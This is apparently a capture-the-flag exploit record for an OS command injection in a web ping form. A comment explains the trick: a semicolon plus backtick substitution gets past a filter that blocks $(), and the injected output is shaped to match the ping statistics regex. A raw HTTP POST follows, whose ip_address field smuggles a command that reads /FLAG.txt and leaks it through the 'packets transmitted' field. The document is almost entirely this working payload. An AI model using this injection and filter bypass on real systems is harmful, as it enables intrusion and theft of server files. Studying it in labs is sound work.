# OS Command Injection via semicolon + backtick substitution. Crafts output matching the ping stats regex '(.*?) packets transmitted...' to exfiltrate /FLAG.txt contents via the Packets Transmitted field. Filter blocks $() but not backticks.

POST /ping HTTP/1.1
Host: 172.17.0.1:33615
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

ip_address=INVALID%3B+echo+%60cat+%2FFLAG.txt%60+packets+transmitted%2C+0+received%2C+0%25+packet+loss